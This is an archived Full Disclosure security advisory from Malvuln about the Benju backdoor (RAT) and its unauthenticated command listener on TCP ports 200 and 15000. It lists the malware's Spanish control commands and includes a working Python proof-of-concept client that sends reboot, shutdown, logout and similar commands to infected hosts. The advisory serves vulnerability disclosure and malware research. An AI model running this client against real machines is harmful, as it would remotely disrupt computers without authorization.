---
title: Backdoor.Win32.Benju.a / Unauthenticated Remote Command	Execution
url: https://seclists.org/fulldisclosure/2024/Sep/58
source: Full Disclosure
date: 2024-09-30
fetch_date: 2025-10-06T18:25:51.422447
---

# Backdoor.Win32.Benju.a / Unauthenticated Remote Command	Execution

[![](/shared/images/nst-icons.svg#menu)](#menu)
![](/shared/images/nst-icons.svg#close)
[![Home page logo](/images/sitelogo.png)](/)

[Nmap.org](https://nmap.org/)
[Npcap.com](https://npcap.com/)
[Seclists.org](https://seclists.org/)
[Sectools.org](https://sectools.org)
[Insecure.org](https://insecure.org/)

![](/shared/images/nst-icons.svg#search)

[![fulldisclosure logo](/images/fulldisclosure-logo.png)](/fulldisclosure/)

## [Full Disclosure](/fulldisclosure/) mailing list archives

[![Previous](/images/left-icon-16x16.png)](57)
[By Date](date.html#58)
[![Next](/images/right-icon-16x16.png)](59)

[![Previous](/images/left-icon-16x16.png)](57)
[By Thread](index.html#58)
[![Next](/images/right-icon-16x16.png)](59)

![](/shared/images/nst-icons.svg#search)

# Backdoor.Win32.Benju.a / Unauthenticated Remote Command Execution

---

*From*: malvuln <malvuln13 () gmail com>
*Date*: Fri, 27 Sep 2024 16:22:37 -0400

---

```
Discovery / credits: Malvuln (John Page aka hyp3rlinx) (c) 2024
Original source:
https://malvuln.com/advisory/88922242e8805bfbc5981e55fdfadd71.txt
Contact: malvuln13 () gmail com
Media: x.com/malvuln

Threat: Backdoor.Win32.Benju.a
Vulnerability: Unauthenticated Remote Command Execution
Family: Benju
Type: PE32
MD5: 88922242e8805bfbc5981e55fdfadd71
SHA256: 7d34804173e09d0f378dfc8c9212fe77ff51f08c9d0b73d00a19b7045ddc1f0e
Vuln ID: MVID-2024-0700
Disclosure: 09/27/2024
Description: The RAT listens on TCP ports 200 and 15000. Third-party
adversaries who can reach an infected host, can execute commands made
available by the malware. Commands are sent in Spanish, using netcat
or telnet fails to run cmds after connecting as they send CRLFs e.g.
"quitar\r\n" fails "quitar" succeeds. Therefore, we need a custom
client to send commands to the Benju RAT.

Reiniciado = reboot
quitar = terminate backdoor
cerrarsesion = shutdown
Enciendemonitor = turn on monitor
apagamonitor = monitor off
Ocultaiconos = hide icons
activachat = open chat window
Bloquearaton = block rat
Desbloquearaton = unblock rat
Activainicio = activate start
cerrarsesion = logout

Ocultaiconos
Conectado
Ocultado los iconos

cerrarsesion
Conectado
Cerrado la sesion de windows

Enciendemonitor
Conectado
Monitor encendido

apagamonitor
Conectado
Monitor apagado

quitar
Conectado
Pc desinfectado

Exploit/PoC:
from socket import *
import time,sys

CMD=["Reiniciado","Enciendemonitor","apagamonitor","Ocultaiconos","Activainicio",
          "activachat","Bloquearaton","Desbloquearaton","cerrarsesion","quitar"]

def chk_res(s):
    res=""
    while True:
        res += s.recv(512).decode()
        if res:
            break
    return res

def Benju_Over(MALWARE_HOST, PTR):

    PORT=200
    s=socket(AF_INET, SOCK_STREAM)
    s.connect((MALWARE_HOST, PORT))
    print(CMD[PTR])

    s.send("".encode())
    print(chk_res(s))
    PAYLOAD= CMD[PTR]   #Don't send CRLFs
    s.send(PAYLOAD.encode())
    time.sleep(0.5)
    print(chk_res(s))
    s.close()
    print("[*] Benju (over) Rat PoC by malvuln")

if __name__=="__main__":
    c=-1
    if len(sys.argv) < 3:
        print("[+] Benju (over) Rat PoC by malvuln")
        print("[+] Greetz Edu_Braun_0day, Indoushka, Todd J")
        print("[!] Usage: Infected IP, Command")
        print("[-]=============================")
        for x in CMD:
            c+=1
            print("[+] "+str(c) + " "+ x)
            exit()
    try:
        MALWARE_HOST=sys.argv[1]
        PTR=int(sys.argv[2])
        if MALWARE_HOST and PTR:
            Benju_Over(MALWARE_HOST, PTR)
    except Exception as e:
        print("[!] "+str(e))
        exit()

Disclaimer: The information contained within this advisory is supplied
"as-is" with no warranties or guarantees of fitness of use or
otherwise. Permission is hereby granted for the redistribution of this
advisory, provided that it is not altered except by reformatting it,
and that due credit is given. Permission is explicitly given for
insertion in vulnerability databases and similar, provided that due
credit is given to the author. The author is not responsible for any
misuse of the information contained herein and accepts no
responsibility for any damage caused by the use or misuse of this
information. The author prohibits any malicious use of security
related information or exploits by the author or elsewhere. Do not
attempt to download Malware samples. The author of this website takes
no responsibility for any kind of damages occurring from improper
Malware handling or the downloading of ANY Malware mentioned on this
website or elsewhere. All content Copyright (c) Malvuln.com (TM).
_______________________________________________
Sent through the Full Disclosure mailing list
https://nmap.org/mailman/listinfo/fulldisclosure
Web Archives & RSS: https://seclists.org/fulldisclosure/
```

---

[![Previous](/images/left-icon-16x16.png)](57)
[By Date](date.html#58)
[![Next](/images/right-icon-16x16.png)](59)

[![Previous](/images/left-icon-16x16.png)](57)
[By Thread](index.html#58)
[![Next](/images/right-icon-16x16.png)](59)

### Current thread:

* **Backdoor.Win32.Benju.a / Unauthenticated Remote Command Execution** *malvuln (Sep 28)*

![](/shared/images/nst-icons.svg#search)

## [Nmap Security Scanner](https://nmap.org/)

* [Ref Guide](https://nmap.org/book/man.html)* [Install Guide](https://nmap.org/book/install.html)* [Docs](https://nmap.org/docs.html)* [Download](https://nmap.org/download.html)* [Nmap OEM](https://nmap.org/oem/)

## [Npcap packet capture](https://npcap.com/)

* [User's Guide](https://npcap.com/guide/)* [API docs](https://npcap.com/guide/npcap-devguide.html#npcap-api)* [Download](https://npcap.com/#download)* [Npcap OEM](https://npcap.com/oem/)

## [Security Lists](https://seclists.org/)

* [Nmap Announce](https://seclists.org/nmap-announce/)* [Nmap Dev](https://seclists.org/nmap-dev/)* [Full Disclosure](https://seclists.org/fulldisclosure/)* [Open Source Security](https://seclists.org/oss-sec/)* [BreachExchange](https://seclists.org/dataloss/)

## [Security Tools](https://sectools.org)

* [Vuln scanners](https://sectools.org/tag/vuln-scanners/)* [Password audit](https://sectools.org/tag/pass-audit/)* [Web scanners](https://sectools.org/tag/web-scanners/)* [Wireless](https://sectools.org/tag/wireless/)* [Exploitation](https://sectools.org/tag/sploits/)

## [About](https://insecure.org/)

* [About/Contact](https://insecure.org/fyodor/)* [Privacy](https://insecure.org/privacy.html)* [Advertising](https://insecure.org/advertising.html)* [Nmap Public Source License](https://nmap.org/npsl/)

[![](/shared/images/nst-icons.svg#twitter)](https://twitter.com/nmap "Visit us on Twitter")
[![](/shared/images/nst-icons.svg#facebook)](https://facebook.com/nmap "Visit us on Facebook")
[![](/shared/images/nst-icons.svg#github)](https://github.com/nmap/ "Visit us on Github")
[![](/shared/images/nst-icons.svg#reddit)](https://reddit.com/r/nmap/ "Discuss Nmap on Reddit")